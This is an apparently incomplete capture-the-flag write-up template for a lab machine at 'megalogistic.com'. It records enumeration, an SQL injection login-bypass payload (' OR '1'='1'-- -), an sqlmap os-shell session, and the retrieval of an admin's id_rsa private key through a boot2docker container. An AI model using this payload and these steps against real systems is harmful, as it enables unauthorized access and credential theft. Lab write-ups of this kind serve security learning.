# Information
- CTF Name: 
- CTF Level:
- CTF Description: 
- Date: 
- Platform: 
- Category: 

# Findings

## External
### Enumeration
![](https://i.imgur.com/EirqPwf.png)
- Users
	- Theresa Winston
	- admin@megalogistic.com
#### PORT 443
VHOST Enum
![](https://i.imgur.com/IXZGCGU.png)
- Tried SQL injection payload on the subdomain and it worked
- ![](https://i.imgur.com/OWffOcp.png)
- with `' OR '1'='1'-- -` i got admin page.
- Then I added on sqlmap and it worked. i used shell on sqlmap
```shell
os-shell> uname -a
do you want to retrieve the command standard output? [Y/n/a]

[21:48:26] [INFO] retrieved: 'Linux bc56e3cc55e9 4.14.154-boot2docker #1 SMP Thu Nov 14 19:19:08 UTC 2019 x86_64 GNU...
command standard output: 'Linux bc56e3cc55e9 4.14.154-boot2docker #1 SMP Thu Nov 14 19:19:08 UTC 2019 x86_64 GNU/Linux'
os-shell>
```
### Gaining Access
![](https://i.imgur.com/bJ2Rduj.png)
it is docker instace then i tried boot2docker and it worked.
then goto `/c` get the admin id_rsa
## Internal
### Enumeration
`$enum$`

### Gaining Access


### Maintaining Access


# Random Notes